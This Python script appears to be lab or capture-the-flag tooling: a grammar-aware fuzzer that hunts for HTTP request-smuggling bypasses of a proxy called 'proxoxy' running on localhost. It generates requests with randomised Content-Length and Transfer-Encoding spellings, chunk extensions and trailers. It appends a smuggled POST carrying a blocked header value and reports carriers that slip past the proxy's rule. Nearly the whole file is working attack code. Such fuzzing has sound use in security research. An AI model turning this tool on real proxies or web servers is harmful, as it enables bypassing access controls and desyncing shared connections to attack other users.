#!/usr/bin/env python3
"""
grammarfuzz - grammar-aware search for a proxoxy framing/scope bypass.

The byte-mutation fuzzers only got ~3% of candidates past the parser, so their
effective coverage of the FRAMING space was tiny.  This generator emits
requests that are syntactically plausible by construction (correct request
line, Host present, coherent framing) and randomises exactly the dimensions
that decide where a message ends: method, target, version, header set, header
casing and padding, Content-Length spelling, transfer codings, chunk sizes,
chunk extensions, trailer lines, and whether a body is present at all.

Oracle: append a complete `POST /FLAGTOK9 ... brevski: george ...` request and
ask the echo lab (proxoxy + hex-echo backend, 38889) whether /FLAGTOK9 comes
back.  Two messages -> rule 2 eats it.  One message -> bypass.
Candidates that echo the token are re-run with `brevski: zzz` as the control.
"""
import random, re, socket, sys, binascii, time

TARGET = ("127.0.0.1", 38889)
TOK = b"/FLAGTOK9"


def smug(val=b"george"):
    return (b"POST " + TOK + b" HTTP/1.1\r\nHost: h\r\nbrevski: " + val
            + b"\r\nContent-Length: 0\r\n\r\n")


END = b"/ENDMARK7"


def fwd(payload, wait=0.10, until_end=False):
    try:
        s = socket.create_connection(TARGET, timeout=2)
    except Exception:
        return None
    try:
        s.sendall(payload)
        s.settimeout(wait)
        out = b""
        try:
            while True:
                d = s.recv(262144)
                if not d:
                    break
                out += d
                if until_end and END in bytes.fromhex(
                        "".join(re.findall(r"[0-9a-f]{2,}", out.decode("latin-1")))
                        if False else "") :
                    break
                if until_end and END.hex().encode() in out:
                    break
        except socket.timeout:
            pass
    except Exception:
        return b""
    finally:
        try:
            s.close()
        except Exception:
            pass
    seen = b""
    while out:
        i = out.find(b"\r\n\r\n")
        if i < 0:
            break
        h = out[:i]
        j = h.lower().find(b"content-length:")
        if j < 0:
            break
        n = int(h[j + 15:].split(b"\r\n")[0].strip())
        try:
            seen += binascii.unhexlify(out[i + 4:i + 4 + n])
        except Exception:
            pass
        out = out[i + 4 + n:]
    return seen


METHODS = [b"POST", b"GET", b"PUT", b"HEAD", b"OPTIONS", b"PATCH", b"DELETE",
           b"PLAY", b"CHEAT", b"X-FOO", b"1A", b"abcdef", b"A" * 20]
TARGETS = [b"/", b"/a", b"/flag", b"/fl%61g", b"//flag", b"/a?b=c", b"/a#f",
           b"http://h/a", b"*", b"/a;p=q", b"/" + b"a" * 200, b"/a/../b"]
VERSIONS = [b"HTTP/1.1", b"HTTP/1.1", b"HTTP/1.1", b"HTTP/1.0"]
PAD = [b"", b" ", b"  ", b"\t", b" \t", b"\t "]
CLSPELL = [b"Content-Length", b"content-length", b"CONTENT-LENGTH", b"CoNtEnT-LeNgTh"]
TESPELL = [b"Transfer-Encoding", b"transfer-encoding", b"TRANSFER-ENCODING"]
CODINGS = [b"chunked", b"CHUNKED", b"Chunked", b"gzip, chunked", b"deflate, chunked",
           b"compress, chunked", b"chunked", b"chunked", b"chunked"]
EXTRA = [b"X-A: 1", b"X-B: " + b"b" * 100, b"Accept: */*", b"User-Agent: x",
         b"Cookie: a=1; b=2", b"Connection: keep-alive", b"Connection: close",
         b"Trailer: X-T", b"X_Under: 1", b"SCRIPT_NAME: /p", b"Content-Type: text/plain",
         b"X-C:", b"X-D: \xc3\xa9", b"Accept-Encoding: gzip", b"Referer: /"]


def gen(rng):
    m = rng.choice(METHODS)
    t = rng.choice(TARGETS)
    v = rng.choice(VERSIONS)
    lines = [m + b" " + t + b" " + v]
    lines.append(b"Host:" + rng.choice(PAD) + b"h" + rng.choice(PAD))
    for _ in range(rng.randrange(0, 4)):
        lines.append(rng.choice(EXTRA))
    mode = rng.randrange(3)
    body = b""
    if mode == 0:                                     # no body
        pass
    elif mode == 1:                                   # content-length
        n = rng.choice([0, 0, 1, 5, 17, 64, 300])
        payload = bytes(rng.randrange(65, 91) for _ in range(n))
        spell = rng.choice(CLSPELL)
        num = str(n).encode()
        if rng.random() < 0.2:
            num = b"0" * rng.randrange(1, 4) + num
        lines.append(spell + b":" + rng.choice(PAD) + num + rng.choice(PAD))
        body = payload
    else:                                             # chunked
        lines.append(rng.choice(TESPELL) + b":" + rng.choice(PAD)
                     + rng.choice(CODINGS) + rng.choice(PAD))
        nchunks = rng.randrange(0, 3)
        for _ in range(nchunks):
            n = rng.choice([1, 2, 7, 16, 40])
            data = bytes(rng.randrange(65, 91) for _ in range(n))
            sz = ("%x" % n).encode()
            if rng.random() < 0.25:
                sz = b"0" * rng.randrange(1, 3) + sz
            if rng.random() < 0.25:
                sz += b";" + rng.choice([b"a=b", b"a", b'a="b"', b"a=b;c=d"])
            body += sz + b"\r\n" + data + b"\r\n"
        last = b"0"
        if rng.random() < 0.3:
            last = b"0" * rng.randrange(1, 4)
        if rng.random() < 0.3:
            last += b";" + rng.choice([b"a=b", b"a", b'a="b"'])
        body += last + b"\r\n"
        for _ in range(rng.randrange(0, 3)):          # trailer lines
            body += rng.choice([b"X-T: v", b"x-t:v", b"X-T:" + b"v" * 50,
                                b"Y: 1", b"Z:" + b"\t" + b"2"]) + b"\r\n"
        body += b"\r\n"
    return b"\r\n".join(lines) + b"\r\n\r\n" + body


def main():
    n = int(sys.argv[1]) if len(sys.argv) > 1 else 20000
    seed = int(sys.argv[2]) if len(sys.argv) > 2 else 1
    rng = random.Random(seed)
    c1 = fwd(b"POST /c HTTP/1.1\r\nHost: h\r\nContent-Length: 0\r\n\r\n" + smug(b"zzz"), 0.2)
    c2 = fwd(b"POST /c HTTP/1.1\r\nHost: h\r\nContent-Length: 0\r\n\r\n" + smug(b"george"), 0.2)
    print("CONTROL zzz-token=%s george-token=%s" % (TOK in (c1 or b""), TOK in (c2 or b"")))
    if TOK not in (c1 or b"") or TOK in (c2 or b""):
        print("controls failed"); return
    t0 = time.time()
    alive = wins = 0
    for i in range(n):
        car = gen(rng)
        r = fwd(car + smug(b"george") + b"GET " + END + b" HTTP/1.1\r\nHost: h\r\n\r\n",
                wait=0.35, until_end=True)
        if not r:
            continue
        alive += 1
        if TOK in r:
            z = fwd(car + smug(b"zzz"), 0.2)
            wins += 1
            print("\n*** BYPASS ***\ncarrier=%r\nfwd(george)=%r\nfwd(zzz)=%r\n"
                  % (car, r, z))
            sys.stdout.flush()
        if (i + 1) % 5000 == 0:
            print("%7d  carrier-forwarded=%d (%.0f%%)  wins=%d  %.0f/s"
                  % (i + 1, alive, 100.0 * alive / (i + 1), wins, (i + 1) / (time.time() - t0)))
            sys.stdout.flush()
    print("done: %d carriers, %d survived parsing, %d bypasses, %.0f/s"
          % (n, alive, wins, n / (time.time() - t0)))


main()
